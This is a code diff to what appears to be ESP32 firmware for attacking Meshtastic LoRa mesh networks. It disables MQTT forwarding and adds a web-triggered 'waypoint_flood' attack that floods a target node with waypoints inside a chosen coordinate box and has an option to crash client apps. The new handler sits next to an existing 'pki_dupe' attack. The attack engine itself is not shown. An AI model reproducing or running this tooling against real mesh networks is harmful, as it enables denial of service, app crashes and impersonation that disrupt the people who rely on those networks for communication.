@@ -92,7 +92,7 @@ void app_main(void) {
     ESP_LOGI(TAG, "Loading radio config.");
     config.load_radio(lora_config);
     meshtasticCompact.loadNodeDb();
-
+    meshtasticCompact.set_ok_to_mqtt(false);
     ESP_LOGI(TAG, "Radio initializing...");
     meshtasticCompact.RadioInit(RadioType::SX1262, radio_pins, lora_config);
     ESP_LOGI(TAG, "Radio initialized.");
@@ -234,6 +234,21 @@ void handle_start_attack(const char* attack_type, JSON_Object* params) {
         tmAttack.setTarget(getNodeIdFromCh(target_id));
         tmAttack.setAttackType(AttackType::PKI_DUPE);
         std::string wsmsg = "{\"type\":\"status_update\", \"current_attack\":\"pki_dupe\"}";
+        ws_sendall((uint8_t*)wsmsg.c_str(), wsmsg.length(), true);
+    }
+    if (strcmp(attack_type, "waypoint_flood") == 0 && params != NULL) {
+        const char* target_id = json_object_get_string(params, "target_id");
+        ESP_LOGI("WEB", "Waypoint Flood Attack Params: target_id=%s", target_id);
+        tmAttack.setTarget(getNodeIdFromCh(target_id));  // not target, but souerce of flood
+        tmAttack.setAttackType(AttackType::WAYPOINT_FLOOD);
+        double min_lat = json_object_get_number(params, "min_lat");
+        double max_lat = json_object_get_number(params, "max_lat");
+        double min_lon = json_object_get_number(params, "min_lon");
+        double max_lon = json_object_get_number(params, "max_lon");
+        uint8_t crashclient = (uint8_t)json_object_get_number(params, "crashclient");
+        tmAttack.setFloodClientCrash(crashclient);
+        tmAttack.setPosParams(min_lat, max_lat, min_lon, max_lon);
+        std::string wsmsg = "{\"type\":\"status_update\", \"current_attack\":\"waypoint_flood\"}";
         ws_sendall((uint8_t*)wsmsg.c_str(), wsmsg.length(), true);
     }
 }
